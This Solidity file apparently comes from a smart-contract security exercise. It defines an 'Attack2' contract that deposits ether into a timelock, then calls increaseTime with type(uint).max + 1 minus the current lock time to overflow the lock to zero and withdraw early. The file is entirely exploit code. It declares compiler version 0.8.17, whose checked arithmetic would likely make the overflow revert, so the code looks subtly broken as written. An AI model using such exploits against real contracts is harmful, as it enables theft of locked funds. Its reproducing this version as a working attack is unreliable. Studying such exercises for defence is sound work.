// SPDX-License-Identifier: MIT

pragma solidity 0.8.17;

interface ITimelock {
    function deposit() external payable;
    function withdraw() external;
    function increaseTime(uint time) external;
    function time(address sender) external returns(uint);
}

contract Attack2 {
    ITimelock timelock;

    constructor(address _timelock){
        timelock = ITimelock(_timelock);
    }

    receive() external payable {}

    function attack() public payable {
        timelock.deposit{value: msg.value}();
        timelock.increaseTime(type(uint).max + 1 - timelock.time(address(this)));
        timelock.withdraw();
    }

    function getBalance() public view returns(uint){
        return address(this).balance;
    }
}